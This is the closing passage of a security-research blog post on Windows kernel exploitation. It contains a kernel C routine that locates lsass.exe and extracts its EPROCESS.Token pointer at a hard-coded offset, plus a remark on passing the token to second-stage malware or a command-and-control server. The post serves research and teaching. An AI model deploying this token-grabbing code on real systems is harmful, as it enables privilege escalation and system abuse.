        <span class="s">"[+] Process.ImageFileName: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
        <span class="n">imageFileName</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">_strnicmp</span><span class="p">(</span><span class="n">imageFileName</span><span class="p">,</span> <span class="s">"lsass.exe"</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// EPROCESS.Token at offset EPROCESS+0x4b8</span>
    <span class="n">tokenPtr</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">QWORD</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">process</span> <span class="o">+</span> <span class="mh">0x4b8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xf</span><span class="p">);</span>

    <span class="n">KdPrintEx</span><span class="p">((</span><span class="n">DPFLTR_IHVDRIVER_ID</span><span class="p">,</span> <span class="n">DPFLTR_INFO_LEVEL</span><span class="p">,</span>
        <span class="s">"[+] Process.Token: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
        <span class="n">tokenPtr</span><span class="p">));</span>

    <span class="k">return</span> <span class="n">tokenPtr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This script loops through every process until <code class="language-plaintext highlighter-rouge">lsass.exe</code> is found. It takes the LSASS token and returns it for further use.</p>

<p>In this code, we access the token’s address from the EPROCESS structure’s <code class="language-plaintext highlighter-rouge">EX_FAST_REF</code> field in one statement, which in many ways summarizes the debugging we did earlier:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// EPROCESS.Token at offset EPROCESS+0x4b8</span>
    <span class="n">tokenPtr</span> <span class="o">=</span> <span class="p">(</span><span class="n">QWORD</span><span class="o">*</span><span class="p">)((</span><span class="n">QWORD</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">process</span> <span class="o">+</span> <span class="mh">0x4b8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xf</span><span class="p">);</span>
</code></pre></div></div>

<p>In a real-world campaign, you could give this token to a second-stage malware or command-and-control server for further system abuse.</p>

<p>The big note here is that we are basically accessing <code class="language-plaintext highlighter-rouge">EPROCESS.Token</code>. Because we have some insight into its data type (<code class="language-plaintext highlighter-rouge">EX_FAST_REF</code>), we know that the final bits could contain superfluous data. Because we have some insight into token address alignment, we also know that we can safely drop them (<code class="language-plaintext highlighter-rouge">&amp; ~0xf</code>).</p>

  </div><a class="u-url" href="/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">halcyondream</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">halcyondream</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/halcyondream"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">halcyondream</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Portfolio for Cybersecurity projects, research, and developments.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
